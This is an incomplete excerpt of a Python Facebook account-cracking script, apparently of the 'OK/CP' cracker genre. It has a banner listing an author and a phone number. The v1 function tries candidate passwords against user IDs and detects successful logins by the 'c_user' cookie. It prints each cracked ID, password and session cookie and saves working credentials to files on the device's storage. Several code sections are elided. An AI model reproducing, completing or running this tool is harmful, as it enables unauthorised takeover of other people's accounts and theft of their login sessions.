...
.d88888b   .d888888  8888ba.88ba  dP  888888ba  
88.    "' d8'    88  88  `8b  `8b 88  88    `8b 
`Y88888b. 88aaaaa88a 88   88   88 88 a88aaaa8P' 
      `8b 88     88  88   88   88 88  88   `8b. 
d8'   .8P 88     88  88   88   88 88  88     88 
 Y88888P  88     88  dP   dP   dP dP  dP     dP 
                                                                                                
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : SADMAN SAMIR SNIGDHO        ║
║  [+] WHATSAPP : +8801324313100              ║
...
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100079300536071 ')
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[RAYIM💛] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                print(f" \n ══════════════════════════════════════════")
                open('/sdcard/RAYIM/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/RAYIM -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RAYIM💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()